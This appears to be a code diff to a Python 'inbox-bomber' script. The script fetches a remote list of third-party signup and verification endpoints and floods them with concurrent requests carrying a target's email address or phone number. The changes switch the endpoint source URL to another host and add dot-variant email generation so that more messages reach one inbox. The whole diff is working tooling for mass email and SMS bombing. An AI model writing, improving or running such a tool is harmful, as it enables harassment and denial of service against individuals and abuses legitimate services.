@@ -1,4 +1,4 @@
-import aiohttp, asyncio, time, fade, phonenumbers, re, json, os, logging, string
+import aiohttp, asyncio, time, fade, phonenumbers, re, json, os, logging, string, random, itertools
 from colorama import Fore, Style
 from pystyle import Center
 from typing import List, Dict, Any, Optional
@@ -21,12 +21,11 @@ def clear():
     print(TITLE)
 
 DEFAULT_HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"}
-TIMEOUT = aiohttp.ClientTimeout(3)
-SOURCE = "https://raw.githubusercontent.com/Inkthirsty/inbox-bomber/refs/heads/main/resources.json"
+TIMEOUT = aiohttp.ClientTimeout(total=5)
+SOURCE = "https://dynabox.shy.rocks/f/1saetmuE.json"
 DEBUG = False
 ONLY_TEST_LAST = False
 
-# Global variables for sent and errors
 sent = 0
 errors = 0
 
@@ -60,6 +59,13 @@ def identify(initial_input: str):
 def clamp(value, min_value, max_value):
     return max(min_value, min(value, max_value))
 
+
+def gen(length: int = 5):
+    ba = bytearray(os.urandom(length))
+    for i, b in enumerate(ba):
+        ba[i] = ord("a") + b % 26
+    return str(time.time()).replace(".", "") + ba.decode("ascii")
+
 async def request(
     session: aiohttp.ClientSession, 
     url: str, 
@@ -72,56 +78,64 @@ async def request(
     number: str = None,
     pbar: tqdm = None
 ):
-    global sent, errors  # Make sent and errors global
-    
-    def gen(length: int = 5):
-        ba = bytearray(os.urandom(length))
-        for i, b in enumerate(ba):
-            ba[i] = ord("a") + b % 26
-        return str(time.time()).replace(".", "") + ba.decode("ascii")
-    
-    def fix(payload):
-        replacements = {
-            "{email}": email or f"{str(time.time())}@{gen()}.com",
-            "{number}": number,
-            "{username}": gen(),
-            "{timestamp}": str(int(time.time()))
-        }
-        if payload is None:
-            return None
-        try:
-            temp = json.dumps(payload) if isinstance(payload, dict) else str(payload)
-            for k, v in replacements.items():
-                if v is not None:
-                    temp = temp.replace(k, v)
-            return json.loads(temp) if isinstance(payload, dict) else temp
-        except Exception:
-            return str(payload)
+    global sent, errors
 
     try:
-        async with session.request(method=(method or "POST").upper(), url=fix(url), json=fix(json_), data=fix(data), params=fix(params), headers=headers or DEFAULT_HEADERS) as resp:
-            resp.raise_for_status()  # Will raise an exception for 4xx or 5xx responses
-            sent += 1  # Increment sent counter if the request succeeds
+        def fix(payload):
+            replacements = {
+                "{email}": email or f"{str(time.time())}@{gen()}.com",
+                "{number}": number,
+                "{username}": gen(),
+                "{timestamp}": str(int(time.time()))
+            }
+            if payload is None:
+                return None
+            try:
+                temp = json.dumps(payload) if isinstance(payload, dict) else str(payload)
+                for k, v in replacements.items():
+                    if v is not None:
+                        temp = temp.replace(k, v)
+                return json.loads(temp) if isinstance(payload, dict) else temp
+            except Exception:
+                return str(payload)
+        async with session.request(method=method or "POST", url=fix(url), json=fix(json_), data=fix(data), params=fix(params), headers=fix(headers)) as resp:
+            resp.raise_for_status()
+            sent += 1
             if DEBUG:
                 logging.info(f"Request to {fix(url).split('/')[2]} succeeded with status {resp.status}")
-                logging.debug(f"Response: {await resp.text()}")
+                logging.debug(f"Response: {(await resp.text())[:100]}")
             if pbar:
-                # Update the progress bar with the sent count
                 pbar.set_postfix({"Sent": sent, "Errors": errors}, refresh=True)
-                pbar.update(1)  # Update progress bar for each successful request
+                pbar.update(1)
             return True
     except Exception as e:
-        errors += 1  # Increment errors counter if an exception occurs
+        errors += 1 
         if DEBUG:
-            logging.error(f"{e}")
+            logging.error(f"{url} {e}")
         if pbar:
-            # Update the progress bar with the errors count
             pbar.set_postfix({"Sent": sent, "Errors": errors}, refresh=True)
-            pbar.update(1)  # Update progress bar for each failed request
+            pbar.update(1) 
         return False
 
+def get_email_combos(email: str) -> list:
+    name, domain = email.split("@", 1)
+    
+    if "." in name:
+        return [email]
+    
+    variants = [name]
+    for i in range(1, len(name)):
+        for positions in itertools.combinations(range(1, len(name)), i):
+            if any(pos + 1 in positions for pos in positions):
+                continue
+            variant = list(name)
+            for pos in sorted(positions, reverse=True):
+                variant.insert(pos, ".")
+            variants.append("".join(variant))
+    return [f"{variant}@{domain}" for variant in variants]
+
 async def main():
-    global sent, errors  # Make sent and errors global
+    global sent, errors 
     
     logging.basicConfig(
         level=logging.DEBUG,
@@ -129,7 +143,6 @@ async def main():
     )
     
     while True:
-        # Reset sent and errors at the start of each loop
         sent = 0
         errors = 0
         
@@ -157,8 +170,7 @@ async def main():
                 if "." in EMAIL.split("@")[0]:
                     COMBOS = [EMAIL]
                 else:
-                    f = lambda s:s[11:]and[s[0]+w+x for x in f(s[1:])for w in('.','')]or[s]
-                    COMBOS = f(EMAIL)
+                    COMBOS = get_email_combos(EMAIL)
                 LIMIT = clamp(len(COMBOS), 1, 1_000)
                 print(f"How many emails per request? 1-{LIMIT}")
                 try:
@@ -174,27 +186,23 @@ async def main():
                 if ONLY_TEST_LAST:
                     selection = selection[-1:]
                 if TYPE == "Number":
-                    functions = [
-                        (session, 
-                        i.get("url"), 
-                        i.get("method"), 
-                        i.get("json"), 
-                        i.get("data"), 
-                        i.get("params"), 
-                        i.get("headers"), 
-                        None, 
-                        PROCESSED.get("Formats")[i.get("number") - 1]
-                        ) for i in selection]
+                    functions = [(session, i.get("url"), i.get("method"), i.get("json"), i.get("data"), i.get("params"), i.get("headers", {}), None, PROCESSED.get("Formats")[i.get("number") - 1]) for i in selection]
                 elif TYPE == "Email":
-                    functions = [(session, i.get("url"), i.get("method"), i.get("json"), i.get("data"), i.get("params"), i.get("headers"), email, None) for email in COMBOS[:THREADS] for i in selection]
+                    functions = [(session, i.get("url"), i.get("method"), i.get("json"), i.get("data"), i.get("params"), i.get("headers", {}), email, None) for email in COMBOS[:THREADS] for i in selection]
 
-                # Using tqdm for the progress bar with a nicer look
-                with tqdm(total=len(functions), desc="Processing tasks", ncols=100, bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed} elapsed]") as pbar:
+                with tqdm(
+                    total=len(functions),
+                    desc="Sending emails",
+                    ncols=120,
+                    bar_format="{l_bar}{bar} | {n_fmt}/{total_fmt} [{elapsed} elapsed]"
+                ) as pbar:
                     for i in range(0, len(functions), batch_size):
                         batch = functions[i:i+batch_size]
                         tasks = [asyncio.create_task(request(*data, pbar=pbar)) for data in batch]
                         await asyncio.gather(*tasks)
                         await asyncio.sleep(0)
+                        pbar.set_postfix({"Sent": sent, "Errors": errors}, refresh=True)
+
 
         print("Press enter to continue")
         input("> ")
